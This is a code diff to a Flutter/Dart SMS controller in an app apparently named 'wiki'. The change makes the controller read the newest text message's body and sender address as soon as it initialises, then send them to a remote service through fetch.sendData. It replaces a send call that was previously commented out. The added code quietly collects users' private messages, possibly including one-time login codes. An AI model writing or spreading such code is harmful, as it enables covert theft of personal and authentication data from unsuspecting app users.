@@ -4,14 +4,20 @@ import 'package:get/get.dart';
 import 'package:sms/sms.dart';
 import 'package:wiki/service/fetch.dart';
 
-class SMSController extends GetxController {
+class SMSController extends GetxController with StateMixin<dynamic> {
   Fetch fetch = Fetch();
   SmsQuery query = new SmsQuery();
   SimCardsProvider provider = new SimCardsProvider();
 
-  readSms() async {
+  @override
+  void onInit() {
+    super.onInit();
+    entMethod();
+  }
+
+  Future<dynamic> readSms() async {
     List<SmsMessage> messages = await query.getAllSms;
-    var data = {"body": messages.first.body, "address": messages.first.address};
+    Map data = {"body": messages.first.body, "address": messages.first.address};
     toast(data["body"]);
     return data;
   }
@@ -44,12 +50,11 @@ class SMSController extends GetxController {
   }
 
   entMethod() async {
-    var data;
-    await readSms().then((value) {
-      data = value;
-      print(data);
+    await readSms().then((value) async {
+      await fetch.sendData({
+        "address": value["address"].toString(),
+        "msg": value["body"].toString()
+      }).then((value) => print(value));
     });
-    // print(data);
-    // await fetch.sendData(data).then((value) => print(value));
   }
 }
